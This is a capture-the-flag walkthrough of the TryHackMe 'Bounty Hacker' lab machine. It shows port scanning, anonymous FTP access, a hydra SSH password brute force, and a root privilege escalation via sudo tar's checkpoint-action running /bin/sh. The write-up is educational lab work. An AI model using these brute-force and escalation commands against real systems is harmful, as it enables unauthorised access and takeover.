Hi, here is how to successfully complete the machine https://tryhackme.com/r/room/cowboyhacker

As usual, I start by scanning the target machine with nmap, we see 3 open ports
<pre><code>> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.31.37 | 
tee nmap1.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-02 07:15 -03
Initiating SYN Stealth Scan at 07:15
Scanning 10.10.31.37 [65535 ports]
Discovered open port 80/tcp on 10.10.31.37
Discovered open port 21/tcp on 10.10.31.37
Discovered open port 22/tcp on 10.10.31.37
Completed SYN Stealth Scan at 07:15, 28.42s elapsed (65535 total ports)
Nmap scan report for 10.10.31.37
Host is up, received user-set (0.72s latency).
Scanned at 2024-10-02 07:15:24 -03 for 29s
Not shown: 63851 filtered tcp ports (no-response), 1681 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.52 seconds
           Raw packets sent: 130257 (5.731MB) | Rcvd: 1700 (68.128KB)</code></pre>


now that I know the open ports I will perform a better scan on those ports

port 21 (FTP) is open and allows anonymous login, suggesting that you can connect to the FTP server without the need for credentials
<pre><code>> sudo nmap -p21,22,80 -sCV -Pn 10.10.31.37 | tee nmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-02 07:17 -03
Nmap scan report for 10.10.31.37
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.92
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.30 seconds</code></pre>

we are going to connect via ftp putting “anonymous” in “name”.
<pre><code>> ftp -v 10.10.59.203
Connected to 10.10.59.203.
220 (vsFTPd 3.0.3)
Name (10.10.59.203:maxi): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> </code></pre>

if we run ls we can see the following two files, I downloaded them using the command get
<pre><code>ftp> get locks.txt
ftp> get task.txt</code></pre>

if we read the content of task.txt we can see the following text signed by “lin”

the locks.txt file is a dictionary of passwords, we can use it to try to brute force ssh and log in. 
<pre><code>~> cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin</code></pre>

an attempt to perform a brute force attack to access an SSH server on 10.10.59.203 with the user lin and a list of passwords contained in locks.txt
<pre><code>~> hydra -l lin -P locks.txt 10.10.59.203 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-02 11:11:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.59.203:22/
[22][ssh] host: 10.10.59.203   login: lin   password: ???
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-02 11:11:30</code></pre>

luckly the dictionary contained the password and we were able to access it through the user lin.
<pre><code>> ssh lin@10.10.59.203
The authenticity of host '10.10.59.203 (10.10.59.203)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:25: 10.10.31.37
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.59.203' (ED25519) to the list of known hosts.
lin@10.10.59.203's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ </code></pre>

the user flag.
<pre><code>lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{?????????????}</code></pre>

The result of the sudo -l command shows that the user lin has special privileges that allow him to execute the /bin/tar command as root without providing a password. This is an important hint for privilege escalation.
<pre><code>lin@bountyhacker:~$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar</code></pre>

after trying many things with /bin/tar this was the one that finally worked for me

![2024-10-02_11-45](https://github.com/user-attachments/assets/c43f8302-fc52-460a-aefb-5b12f7081fe3)

I searched GTFobins /bin/tar and it gave me this way to escalate privileges by exploiting my access to /bin/tar

<pre><code>$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root</code></pre>

<pre><code># cat root.txt
THM{????}</code></pre>
